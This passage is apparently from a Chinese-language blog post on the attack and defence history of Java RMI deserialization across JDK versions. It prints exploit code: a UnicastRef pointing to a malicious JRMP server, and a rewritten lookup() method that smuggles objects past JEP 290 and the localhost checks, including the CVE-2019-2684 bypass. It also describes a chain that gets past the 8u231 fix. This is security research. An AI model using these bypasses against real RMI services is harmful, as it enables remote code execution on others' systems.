Registry反序列化UnicastRef类，从UnicastRef#readExternal()一直调用到StreamRemoteCall#executeCall，与恶意JRMP服务器建立链接，并取回序列化数据进行反序列化操作，这时候的RMI Registry相当于客户端</p><p>指定jrmp 连接基础代码：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">java.rmi.server.ObjID objId = <span class="hljs-keyword">new</span> java.rmi.server.<span class="hljs-constructor">ObjID()</span>;<br>sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="hljs-keyword">new</span> sun.rmi.transport.tcp.<span class="hljs-constructor">TCPEndpoint(<span class="hljs-params">host</span>, <span class="hljs-params">port</span>)</span>;<br>sun.rmi.transport.LiveRef liveRef = <span class="hljs-keyword">new</span> sun.rmi.transport.<span class="hljs-constructor">LiveRef(<span class="hljs-params">objId</span>, <span class="hljs-params">endpoint</span>, <span class="hljs-params">false</span>)</span>;<br>return <span class="hljs-keyword">new</span> sun.rmi.server.<span class="hljs-constructor">UnicastRef(<span class="hljs-params">liveRef</span>)</span>;<br></code></pre></td></tr></table></figure><p>3、RMI Registry反序列化我们构造好的恶意序列化数据，完成漏洞利用</p><h5 id="2-3-2-UnicastRef-包装恶意Padyload"><a href="#2-3-2-UnicastRef-包装恶意Padyload" class="headerlink" title="2.3.2 UnicastRef 包装恶意Padyload"></a>2.3.2 UnicastRef 包装恶意Padyload</h5><p>UnicastRef gadget chain：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>具体调用链如下，readExternal()会向ConnectionInputStream对象中存储Ref信息(包含jrmp链接的host、port等信息)，然后再调用sun.rmi.transport.StreamRemoteCall#releaseInputStream一直到sun.rmi.server.UnicastRef#invoke中对jrmp服务端返回的数据进行反序列化操作。这两处操作需要注意下，后面的JDK修复也是针对这两处进行修复的</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\server\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRef</span>.</span></span><span class="hljs-keyword">class</span><br>public void read<span class="hljs-constructor">External(ObjectInput <span class="hljs-params">var1</span>)</span> throws IOException, ClassNotFoundException &#123;<br>        this.<span class="hljs-built_in">ref</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span>read(var1, <span class="hljs-literal">false</span>);<br>&#125;<br><br><br><br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span><span class="hljs-keyword">class</span><br>public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException &#123;<br>        TCPEndpoint var2;<br>        <span class="hljs-keyword">if</span> (var1) &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read(var0);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read<span class="hljs-constructor">HostPortFormat(<span class="hljs-params">var0</span>)</span>;<br>        &#125;<br><br>        ObjID var3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjID</span>.</span></span>read(var0);<br>        boolean var4 = var0.read<span class="hljs-constructor">Boolean()</span>;<br>        LiveRef var5 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">LiveRef(<span class="hljs-params">var3</span>, <span class="hljs-params">var2</span>, <span class="hljs-params">false</span>)</span>;<br>        <span class="hljs-keyword">if</span> (var0 instanceof ConnectionInputStream) &#123;<br>            ConnectionInputStream var6 = (ConnectionInputStream)var0;<br>            var6.save<span class="hljs-constructor">Ref(<span class="hljs-params">var5</span>)</span>;                                            <span class="hljs-comment">//1</span><br>            <span class="hljs-keyword">if</span> (var4) &#123;<br>                var6.set<span class="hljs-constructor">AckNeeded()</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DGCClient</span>.</span></span>register<span class="hljs-constructor">Refs(<span class="hljs-params">var2</span>, Arrays.<span class="hljs-params">asList</span>(<span class="hljs-params">var5</span>)</span>);<br>        &#125;<br><br>  <br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConnectionInputStream</span>.</span></span><span class="hljs-keyword">class</span><br>void save<span class="hljs-constructor">Ref(LiveRef <span class="hljs-params">var1</span>)</span> &#123;<br>        Endpoint var2 = var1.get<span class="hljs-constructor">Endpoint()</span>;<br>        Object var3 = (List)this.incomingRefTable.get(var2);<br>        <span class="hljs-keyword">if</span> (var3<span class="hljs-operator"> == </span>null) &#123;<br>            var3 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ArrayList()</span>;<br>            this.incomingRefTable.put(var2, var3);    <span class="hljs-comment">//2</span><br>        &#125;<br><br>        ((List)var3).add(var1);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/11.png"></p><p>sun.rmi.transport.StreamRemoteCall#executeCall 对JRMP返回的数据进行反序列化操作</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/12.png"></p><p>相对应的EXP构造在ysoserial.exploit.JRMPListener#doCall中，先往数据流写入ExceptionalReturn值(2)，接着写入我们的恶意Payload</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/13.png"></p><h5 id="2-3-3-Remote接口类包装UnicastRef类"><a href="#2-3-3-Remote接口类包装UnicastRef类" class="headerlink" title="2.3.3 Remote接口类包装UnicastRef类"></a>2.3.3 Remote接口类包装UnicastRef类</h5><p>利用思路是没问题了，但是还有一个问题：我们如何将UnicastRef发送到RMI Registry，这个类并没有实现Remote接口，所以无法直接绑定到注册中心</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/14.png"></p><p>只有将UnicastRef对象包装为Remote类型才能继续绑定。有几种方法能做到：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>、利用动态代理，可指定任意接口类型<br><span class="hljs-number">2</span>、找一个实现<span class="hljs-comment">Remote接口且存在UnicastRef类型的字段的类进行包装</span><br></code></pre></td></tr></table></figure><p>其实ysoserial.exploit.RMIRegisterExploit中使用的就是第一种方法，作者使用的handler是sun.reflect.annotation.AnnotationInvocationHandler，将其动态代理为Remote类型。但是这个类并不在JEP290白名单中，无法满足要求。所以需要重新找。</p><p>第二种思路，找到了RemoteObjectInvocationHandler，这个类的父类RemoteObject具有一个RemoteRef类型（UnicastRef实现了此接口）的属性，并且本身实现了Remote接口。满足我们的要求</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/15.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/16.png"></p><p>但是我们可以看到ref属性是transient 关键字修饰，表明ref属性默认不被序列化，那我们找的这个类是不是不满足需求了呢？并不是！我们查看RemoteObjectInvocationHandler父类java.rmi.server.RemoteObject重写了writeObject()，其利用了writeExternal来写入被transient 修饰的ref属性值。所以依旧可以被反序列化</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/17.png"></p><p>我们直接使用RemoteObjectInvocationHandler包裹下UnicastRef对象即可。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/18.png"></p><p><strong>而ysoserial.payloads.JRMPClient中利用了RemoteObjectInvocationHandler可动态代理为任意接口的特性，将UnicastRef对象转化为Remote子接口Registry进行传递。其实不用这么复杂，直接使用RemoteObjectInvocationHandler包装一下就OK了</strong></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/19.png"></p><p>综上看来，RemoteObject其实更符合我们的要求：属性ref可包裹UnicastRef对象，其本身又实现了Remote接口。那他的子类理论上来说均是可以满足要求的。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/20.png"></p><p>但是事实并不是我们想象的那样，调试发现在操作序列化写入数据时，会进行判断(enableReplace值默认为true)，如果满足”目标类实现Remote接口 &amp;&amp; 未实现RemoteStub接口 &amp;&amp;  “则会将我们构造的恶意类替换。从而导致攻击利用失败。如下是调用过程替换方法replaceObject()的逻辑代码</p><p>java.io.ObjectOutputStream#writeObject0</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/21.png"></p><p>sun.rmi.server.MarshalOutputStream#replaceObject</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/22.png"></p><p>而RemoteStub是RemoteObject的子类，所以我们要找的目标类只需要缩小范围，只找RemoteStub子类即可满足要求。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/23.png"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">RMIConnectionImpl_Stub、RMIServerImpl_Stub、ActivationGroup_Stub、DGCImpl_Stub、Activation<span class="hljs-symbol">$Activatio</span>nSystemImpl_Stub、ReferenceWrapper_Stub、RegistryImpl_Stub<br></code></pre></td></tr></table></figure><p>经测试，这些类直接包裹unicastRef对象就可以完成利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/24.png"></p><p>另外也可以利用反射修改enableReplace值，则RemoteObject的子类均可用了</p><h3 id="3、jdk-x3D-8u141"><a href="#3、jdk-x3D-8u141" class="headerlink" title="3、jdk &#x3D; 8u141"></a>3、jdk &#x3D; 8u141</h3><h4 id="3-1-限制1：RMI-bind-x2F-rebind-x2F-unbind-操作限制来源地址为本地"><a href="#3-1-限制1：RMI-bind-x2F-rebind-x2F-unbind-操作限制来源地址为本地" class="headerlink" title="3.1 限制1：RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地"></a>3.1 限制1：RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地</h4><blockquote><p>其实在jdk的早期版本中bind&#x2F;unbind&#x2F;rebind操作都会限制地址，只不过校验是在反序列化之后进行的，所以并没有对我们进行漏洞利用产生影响。但是在8u141的更新中限制了RMI bind&#x2F;rebind&#x2F;unbind 操作限制来源地址为本地地址。如下图是jdk8u121的sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl_Skel.java#dispatch()代码：反序列化操作完成之后才进行sun.rmi.registry.RegistryImpl#checkAccess地址检测</p></blockquote><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/25.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/26.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/27.png"></p><p>oracle官方在8u141对此处做了修改，防止外部攻击者的恶意对注册表进行bind&#x2F;unbind操作。下面是jdk8u121与8u141的对比，可以发现将checkAccess操作提前至反序列化之前。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/28.png"></p><p>这就影响了ysoserial.exploit.RMIRegistryExploit的使用，此exp正是通过bind恶意类到注册中心完成攻击的。那有没有其他操作可以帮助我们完成恶意序列数据的传递呢。观察同文件下的其他操作，lookup()用于客户端向注册端查询，直接对数据流进行readObject()操作，并且没有checkAccess()地址来源校验。满足我们的要求</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/29.png"></p><h4 id="3-2-绕过1：RMI-lookup-绕过对来源地址的限制"><a href="#3-2-绕过1：RMI-lookup-绕过对来源地址的限制" class="headerlink" title="3.2 绕过1：RMI lookup 绕过对来源地址的限制"></a>3.2 绕过1：RMI lookup 绕过对来源地址的限制</h4><p>根据上一小节描述，我们可以晓得在8u141及之后，即使使用白名单中的UnicastRef类绕过了JEP290，官方对bind&#x2F;unbind&#x2F;rebind操作的限制来源为本地，导致无法完成利用。我们看到在同文件下的lookup方法满足要求（1、未检查来源地址；2、虽然传递的是String类型参数，但是在写入使用的是writeObject操作），我们无法直接拿sun.rmi.registry.RegistryImpl_Stub#lookup来使用，需要进行简单改造，使其支持传入Object类型参数</p><p>sun.rmi.registry.RegistryImpl_Stub#lookup</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/30.png"></p><p>我们仿照逻辑重写一个支持传入Object类型参数的lookup方法</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> Remote lookup(Registry registry,Object var1) throws Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RemoteRef ref = (RemoteRef) Reflections.getFieldValue(registry,<span class="hljs-string">&quot;ref&quot;</span>);<br>            Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-type">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br>            RemoteCall var2 = ref.<span class="hljs-keyword">new</span><span class="hljs-type">Call</span>((RemoteObject) registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071</span>L);<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectOutput var3 = var2.getOutputStream();<br>                var3.writeObject(var1);<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var18) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">MarshalException</span>(<span class="hljs-string">&quot;error marshalling arguments&quot;</span>, var18);<br>            &#125;<br><br>            ref.invoke(var2);<br><br><span class="hljs-comment">//处理返回信息的代码逻辑也可以删除</span><br>            Remote var23;<br>            <span class="hljs-keyword">try</span> &#123;<br>                ObjectInput var6 = var2.getInputStream();<br>                var23 = (Remote)var6.readObject();<br>            &#125; <span class="hljs-keyword">catch</span> (IOException var15) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var15);<br>            &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var16) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnmarshalException</span>(<span class="hljs-string">&quot;error unmarshalling return&quot;</span>, var16);<br>            &#125; finally &#123;<br>                ref.done(var2);<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> var23;<br>        &#125; <span class="hljs-keyword">catch</span> (RuntimeException var19) &#123;<br>            <span class="hljs-keyword">throw</span> var19;<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException var20) &#123;<br>            <span class="hljs-keyword">throw</span> var20;<br>        &#125; <span class="hljs-keyword">catch</span> (NotBoundException var21) &#123;<br>            <span class="hljs-keyword">throw</span> var21;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var22) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-type">UnexpectedException</span>(<span class="hljs-string">&quot;undeclared checked exception&quot;</span>, var22);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/31.png"></p><h4 id="3-3-绕过2：绕过本地地址限制（CVE-2019-2684）"><a href="#3-3-绕过2：绕过本地地址限制（CVE-2019-2684）" class="headerlink" title="3.3 绕过2：绕过本地地址限制（CVE-2019-2684）"></a>3.3 绕过2：绕过本地地址限制（CVE-2019-2684）</h4><p>在1.2节我们演示了构造DGC层数据的构造、在3.2节我们重写了lookup方法使其可以传入Object类型的参数。对于此类RPC的调用，数据全部由客户端构造，攻击者可以任意更改传输数据去应对服务端的过滤处理逻辑。而回到我们这里讨论的JDK8u141加上localhost限制，我们类比DGC层数据构造、改造lookup方法的操作，可以动手改造bind方法去解决。关于该绕过，貌似关注的人极少。且Ysoserial也未对此限制绕过编写EXP，所以这里动手写一下。具体思路由如下两种：</p><p>1、重写bind逻辑，使得在判断时进入lookup的处理逻辑进而触发UnicastRef反序列化链。</p><p>2、重写bind逻辑，使服务端进入“调用自定义方法“的逻辑，而自定义方法的参数是序列化参数，并未进入oldDispatch，导致可以绕过localhost的判断</p><p>思路1其实本质来说与3.2的绕过1是相同的，均利用了未做鉴权的lookup方法</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/32.png"></p><p>绕过的exp 1：</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/33.png"></p><p>我们看下思路2：</p><p>当opnum&lt;0时表明是用户自定义方法，服务端根据<code>hashToMethod_Map.get(方法hash值)</code>确认目标方法。但是其内置了Registry的5个操作方法，我们只需要传入对应方法的hash值即可。</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/34.png"></p><p>最终使用sun.rmi.server.UnicastRef#unmarshalValue组装”自定义方法参数”时调用readObject设置JRMP反向连接、releaseInputStream()释放数据流时请求恶意服务触发二次反序列化</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/35.png"></p><p>最终通过重写lookup、bind的方式完成了本地地址限制的绕过</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/36.png"></p><h3 id="4、jdk-x3D-8u231"><a href="#4、jdk-x3D-8u231" class="headerlink" title="4、jdk &#x3D; 8u231"></a>4、jdk &#x3D; 8u231</h3><h4 id="4-1-限制1：RMI-修复UnicastRef链绕过的问题"><a href="#4-1-限制1：RMI-修复UnicastRef链绕过的问题" class="headerlink" title="4.1 限制1：RMI 修复UnicastRef链绕过的问题"></a>4.1 限制1：RMI 修复UnicastRef链绕过的问题</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//修复1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//修复2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><h5 id="4-1-1-清除UnicastRef的反连地址"><a href="#4-1-1-清除UnicastRef的反连地址" class="headerlink" title="4.1.1 清除UnicastRef的反连地址"></a>4.1.1 清除UnicastRef的反连地址</h5><p>在JDK8U231版本在sun.rmi.registry.RegistryImpl_Skel#dispatch处理bind、lookup、rebind、unbind操作时增加了sun.rmi.transport.StreamRemoteCall#discardPendingRefs方法，当反序列化时发生IO&#x2F;类找不到或类型转换错误时，会调用sun.rmi.transport.ConnectionInputStream#discardRefs方法，去掉UnicastRef的反连地址(之前存储地址时使用的是ConnectionInputStream#saveRef)，导致UnicastRef JRMP外连链无法利用</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/37.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/38.png"></p><p>当服务端处理“由客户端改造的lookup()传输的UnicastRef恶意数据”时，readObject会正常执行，但是当转为String类型时触发catch ClassCastException错误，进入discardPendingRefs进行清除数据。我们可以看到incomingRefTable在处理前后的对比</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/39.png"></p><p>执行discardPendingRefs操作后</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/40.png"></p><h5 id="4-1-2-对反连拿到的对象进行白名单校验"><a href="#4-1-2-对反连拿到的对象进行白名单校验" class="headerlink" title="4.1.2 对反连拿到的对象进行白名单校验"></a>4.1.2 对反连拿到的对象进行白名单校验</h5><p>另外Registry在处理JRMP反连操作时会最终会调用到sun.rmi.transport.DGCImpl_Stub#dirty方法，并在this.ref.invoke(var5);操作中触发反序列化操作，8u231在invoke前增加了白名单限制sun.rmi.transport.DGCImpl_Stub#leaseFilter导致</p><p>返回的序列化对象无法通过检测</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/41.png"></p><p>leaseFilter白名单：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UID<span class="hljs-selector-class">.class</span><br>VMID<span class="hljs-selector-class">.class</span><br>Lease<span class="hljs-selector-class">.class</span><br>Throwable<br><span class="hljs-string">&quot;java.lang.*&quot;</span><br><span class="hljs-string">&quot;java.rmi.*&quot;</span><br>StackTraceElement<span class="hljs-selector-class">.class</span><br>ArrayList<span class="hljs-selector-class">.class</span><br>Object<span class="hljs-selector-class">.class</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableCollection</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$UnmodifiableRandomAccessList</span><br>java<span class="hljs-selector-class">.util</span>.Collections<span class="hljs-variable">$EmptyList</span><br></code></pre></td></tr></table></figure><h4 id="4-2-绕过1：使用UnicastRemoteObject链绕过修复"><a href="#4-2-绕过1：使用UnicastRemoteObject链绕过修复" class="headerlink" title="4.2 绕过1：使用UnicastRemoteObject链绕过修复"></a>4.2 绕过1：使用UnicastRemoteObject链绕过修复</h4><p><strong>这条链与 之前绕过JEP290的UnicastRef 链不同之处在与它并不是在 StreamRemoteCall#releaseInputStream中触发JRMP外连，而是在调用readObject的时候就触发了，所以可以绕过8u231的修复补丁</strong>。这条链是由An Trinh 发现并在19年Blackhat上公布的，详情可参考：<a href="https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf">https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf</a></p><p>相当于从UnicastRemoteObject.readObject()通过”一系列操作“ 最终调用到了UnicastRef.invoke()，刚好绕过官方的两步修复方案。UnicastRef链及8u231的修复方案</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">UnicastRef gadget chain：<br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//修复1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//修复2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>我们观察修复方案可以发现：官方并没有处理sun.rmi.server.UnicastRef#invoke之后的操作，相当于sink点没变，绕过补丁需要找一处反序列化的source点，source点需要满足如下条件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 